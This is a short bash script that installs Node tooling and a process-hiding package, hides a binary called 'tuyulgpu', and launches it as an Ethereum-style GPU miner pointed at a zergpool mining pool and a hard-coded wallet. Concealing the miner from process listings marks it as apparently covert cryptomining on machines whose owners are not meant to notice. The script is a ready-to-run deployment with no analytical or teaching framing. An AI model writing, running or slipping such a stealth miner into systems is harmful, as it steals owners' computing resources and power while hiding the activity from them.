#!/bin/bash
apt update
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
npm i -g node-process-hider 
ph add tuyulgpu

POOL=ethash.mine.zergpool.com:9999

WALLET=7ZKyzh2m9r6VQeJ7tEn48eWZAZUFXMhzh2

WORKER=$(echo $(shuf -i 1-99999 -n 1)-Dash)

chmod +x tuyulgpu

./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
